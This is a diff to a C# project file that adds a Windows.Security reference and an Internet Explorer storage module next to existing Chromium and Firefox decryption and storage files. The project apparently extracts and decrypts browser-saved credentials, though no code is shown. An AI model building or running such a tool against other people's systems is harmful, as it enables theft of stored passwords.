@@ -46,12 +46,16 @@
     <Reference Include="Microsoft.CSharp" />
     <Reference Include="System.Data" />
     <Reference Include="System.Xml" />
+    <Reference Include="Windows.Security">
+      <HintPath>..\..\..\..\..\..\Windows\System32\WinMetadata\Windows.Security.winmd</HintPath>
+    </Reference>
   </ItemGroup>
   <ItemGroup>
     <Compile Include="ChromiumEngine\Cryptography\BCrypt.cs" />
     <Compile Include="ChromiumEngine\Cryptography\AesGcm.cs" />
     <Compile Include="ChromiumEngine\ChromiumStorage.cs" />
     <Compile Include="ChromiumEngine\SQL\SQLite.cs" />
+    <Compile Include="InternetExplorer\IEStorage.cs" />
     <Compile Include="Utlis\Enums.cs" />
     <Compile Include="Firefox\FFDecryptor.cs" />
     <Compile Include="Firefox\FirefoxStorage.cs" />
